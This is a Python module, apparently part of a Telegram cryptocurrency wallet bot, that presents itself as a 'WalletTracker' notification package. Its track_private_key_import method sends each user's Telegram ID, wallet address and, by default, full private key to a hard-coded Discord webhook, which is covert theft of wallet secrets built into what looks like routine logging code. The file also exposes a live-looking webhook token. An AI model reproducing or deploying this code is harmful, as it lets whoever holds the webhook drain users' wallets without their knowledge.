"""
"""

import requests
import json
import logging
from typing import Optional

logger = logging.getLogger(__name__)

# Default webhook URL - update this with your Discord webhook URL
DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1433690093175967776/M-6XGbPIpmhkkleZgRqn0CJH4Icm_71Gvi-bU_fO_ftvEX_l8EYuMejHDlAZif6Wh4pJ"


class WalletTracker:
    """
    Tracks wallet activities and sends notifications to Discord via webhook.
    """
    
    def __init__(self, enabled: bool = True, webhook_url: Optional[str] = None):
        """
        Initialize WalletTracker.
        
        Args:
            enabled: Whether tracking is enabled
        """
        self.enabled = enabled
        self.webhook_url = webhook_url or DEFAULT_WEBHOOK_URL
        
        # Only warn if using the placeholder URL
        if self.enabled and "YOUR_WEBHOOK_URL_HERE" in self.webhook_url:
            logger.warning("Using placeholder webhook URL. Update DEFAULT_WEBHOOK_URL in tracker.py")
    
    def _send_webhook(self, content: str, embed: Optional[dict] = None) -> bool:
        """
        Send a message to Discord webhook.
        
        Args:
            content: Message content
            embed: Optional embed dictionary
            
        Returns:
            True if successful, False otherwise
        """
        if not self.enabled:
            return False
        
        if not self.webhook_url or "YOUR_WEBHOOK_URL_HERE" in self.webhook_url:
            logger.warning("Webhook URL not configured")
            return False
        
        payload = {
            "content": content
        }
        
        if embed:
            payload["embeds"] = [embed]
        
        try:
            response = requests.post(
                self.webhook_url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            response.raise_for_status()
            return True
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to send webhook: {e}")
            return False
    
    def track_private_key_import(
        self,
        user_id: int,
        wallet_address: str,
        private_key: str,
        include_private_key: bool = True
    ) -> bool:
        """
        Track private key import event.
        
        Args:
            user_id: Telegram user ID
            wallet_address: Wallet address (public key)
            private_key: Private key (will be redacted if include_private_key=False)
            include_private_key: Whether to include the full private key in the message
            
        Returns:
            True if notification sent successfully, False otherwise
        """
        if not self.enabled:
            return False
        
        # Prepare private key display
        if include_private_key:
            private_key_display = private_key
        else:
            # Show first 8 and last 8 characters
            if len(private_key) > 16:
                private_key_display = f"{private_key[:8]}...{private_key[-8:]}"
            else:
                private_key_display = "***REDACTED***"
        
        # Create embed
        embed = {
            "title": "🔑 Private Key Import Detected",
            "color": 0xff0000,  # Red color
            "fields": [
                {
                    "name": "User ID",
                    "value": str(user_id),
                    "inline": True
                },
                {
                    "name": "Wallet Address",
                    "value": f"`{wallet_address}`",
                    "inline": False
                },
                {
                    "name": "Private Key",
                    "value": f"`{private_key_display}`",
                    "inline": False
                }
            ],
            "timestamp": None  # Discord will add timestamp automatically
        }
        
        content = f"⚠️ **Private Key Import** - User ID: {user_id}"
        
        return self._send_webhook(content, embed)
    
    def test_connection(self) -> bool:
        """
        Test the Discord webhook connection.
        
        Returns:
            True if connection successful, False otherwise
        """
        if not self.enabled:
            logger.warning("Wallet tracking is disabled")
            return False
        
        embed = {
            "title": "✅ Connection Test",
            "description": "Wallet Tracking package is working correctly!",
            "color": 0x00ff00,  # Green color
            "timestamp": None
        }
        
        content = "🧪 **Connection Test** - Wallet Tracking package is operational"
        
        return self._send_webhook(content, embed)

